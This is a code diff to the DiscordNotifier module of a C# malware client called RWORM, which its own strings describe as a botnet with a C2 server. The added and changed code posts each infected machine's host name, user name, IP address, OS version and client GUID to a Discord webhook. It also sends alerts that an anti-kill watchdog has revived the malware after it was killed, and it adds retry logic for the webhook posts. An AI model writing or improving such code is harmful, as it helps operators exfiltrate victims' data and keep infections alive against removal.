@@ -8,7 +8,37 @@ namespace RWORM.Client.Modules
 {
     public static class DiscordNotifier
     {
+        private const string WebhookThumbnailUrl = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/GUI/Resources/Assets/rwm3.png";
+        private const string WebhookEveryone = "@everyone";
+
         private static readonly HttpClient Http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
+
+        private static async Task<System.Net.Http.HttpResponseMessage> PostWithRetryAsync(string webhookUrl, string json)
+        {
+            using var client = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(10) };
+            var content = new System.Net.Http.StringContent(json, System.Text.Encoding.UTF8, "application/json");
+            for (int attempt = 0; attempt < 3; attempt++)
+            {
+                var response = await client.PostAsync(webhookUrl, content).ConfigureAwait(false);
+                if ((int)response.StatusCode == 429)
+                {
+                    var wait = TimeSpan.FromSeconds(1);
+                    try
+                    {
+                        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
+                        using var doc = System.Text.Json.JsonDocument.Parse(body);
+                        if (doc.RootElement.TryGetProperty("retry_after", out var retryEl) && retryEl.ValueKind == System.Text.Json.JsonValueKind.Number)
+                            wait = TimeSpan.FromSeconds(retryEl.GetDouble());
+                    }
+                    catch { }
+                    if (wait > TimeSpan.FromSeconds(3)) wait = TimeSpan.FromSeconds(3);
+                    await Task.Delay((int)wait.TotalSeconds * 1000 + 250).ConfigureAwait(false);
+                    continue;
+                }
+                return response;
+            }
+            return new System.Net.Http.HttpResponseMessage(System.Net.HttpStatusCode.InternalServerError);
+        }
 
         private static string EscapeJson(string? s)
         {
@@ -55,10 +85,9 @@ namespace RWORM.Client.Modules
                 var i = EscapeJson(string.IsNullOrWhiteSpace(ip) ? "Unknown" : ip);
                 var g = EscapeJson(guid);
 
-                var json = $"{{\"username\":\"RWORM C2 Alert\",\"avatar_url\":\"https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png\",\"embeds\":[{{\"title\":\"\ud83d\udfe2 Client Connected Online\",\"description\":\"**Host:** `{h}`\\n**User:** `{u}`\",\"color\":3066993,\"fields\":[{{\"name\":\"IP Address\",\"value\":\"{i}\",\"inline\":true}},{{\"name\":\"OS Version\",\"value\":\"{o}\",\"inline\":true}},{{\"name\":\"Client GUID\",\"value\":\"`{g}`\",\"inline\":false}}],\"footer\":{{\"text\":\"RWORM Botnet \u2022 Connection Alert\"}},\"timestamp\":\"{DateTime.UtcNow:o}\"}}]}}";
+                var json = $"{{\"username\":\"RWorm BITA\",\"avatar_url\":\"https://github.com/exsarorrayzer/rworm/blob/main/GUI/Resources/Assets/rwormicon.png?raw=true\",\"content\":\"{WebhookEveryone}\",\"embeds\":[{{\"title\":\"<:checkmark:1569394022932422656> New Client Connected to C2\",\"description\":\"**Host:** <:pc:1569394483114541056>`{h}`\\n**User:** <:client:1569397753006530701>`{u}`\",\"color\":12849673,\"thumbnail\":{{\"url\":\"{WebhookThumbnailUrl}\"}},\"fields\":[{{\"name\":\"IP Address\",\"value\":\"{i}\",\"inline\":true}},{{\"name\":\"<:windows:1569394768310706278> OS Version\",\"value\":\"{o}\",\"inline\":true}},{{\"name\":\"Client GUID\",\"value\":\"`{g}`\",\"inline\":false}}],\"footer\":{{\"text\":\"RWorm Build In Task Alerts\"}},\"timestamp\":\"{DateTime.UtcNow:o}\"}}]}}";
 
-                using var content = new StringContent(json, Encoding.UTF8, "application/json");
-                await Http.PostAsync(webhookUrl, content).ConfigureAwait(false);
+                _ = await PostWithRetryAsync(webhookUrl, json).ConfigureAwait(false);
             }
             catch
             {
@@ -77,14 +106,13 @@ namespace RWORM.Client.Modules
                 var host = EscapeJson(Environment.MachineName);
                 var user = EscapeJson(Environment.UserName);
 
-                var json = $"{{\"username\":\"RWORM Watchdog\",\"avatar_url\":\"https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png\",\"embeds\":[{{\"title\":\"\ud83d\udee1\ufe0f Anti-Kill Watchdog Alert\",\"description\":\"\u26a0\ufe0f **Target process was killed!**\\nBackup watchdog successfully revived: `{exe}`\",\"color\":15158332,\"fields\":[{{\"name\":\"Host\",\"value\":\"{host}\",\"inline\":true}},{{\"name\":\"User\",\"value\":\"{user}\",\"inline\":true}}],\"footer\":{{\"text\":\"RWORM Watchdog Subsystem\"}},\"timestamp\":\"{DateTime.UtcNow:o}\"}}]}}";
+                var json = $"{{\"username\":\"RWorm BITA\",\"avatar_url\":\"https://github.com/exsarorrayzer/rworm/blob/main/GUI/Resources/Assets/rwormicon.png?raw=true\",\"content\":\"{WebhookEveryone}\",\"embeds\":[{{\"title\":\"<:shield1:1569401973957201951> Anti-Kill Alert\",\"description\":\"⚠️ **Target process was killed!**\\nBackup watchdog successfully revived: `{exe}`\",\"color\":16728128,\"thumbnail\":{{\"url\":\"{WebhookThumbnailUrl}\"}},\"fields\":[{{\"name\":\"<:pc:1569394483114541056> Host\",\"value\":\"{host}\",\"inline\":true}},{{\"name\":\"<:client:1569397753006530701> User\",\"value\":\"{user}\",\"inline\":true}}],\"footer\":{{\"text\":\"RWorm Build In Task Alerts\"}},\"timestamp\":\"{DateTime.UtcNow:o}\"}}]}}";
 
-                using var content = new StringContent(json, Encoding.UTF8, "application/json");
-                await Http.PostAsync(webhookUrl, content).ConfigureAwait(false);
+                _ = await PostWithRetryAsync(webhookUrl, json).ConfigureAwait(false);
             }
             catch
             {
-                // Non-blocking fail-safe
+                
             }
         }
     }
